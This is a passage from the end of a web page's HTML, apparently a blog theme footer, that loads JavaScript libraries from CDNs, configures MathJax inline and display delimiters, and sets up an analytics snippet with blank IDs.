`<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
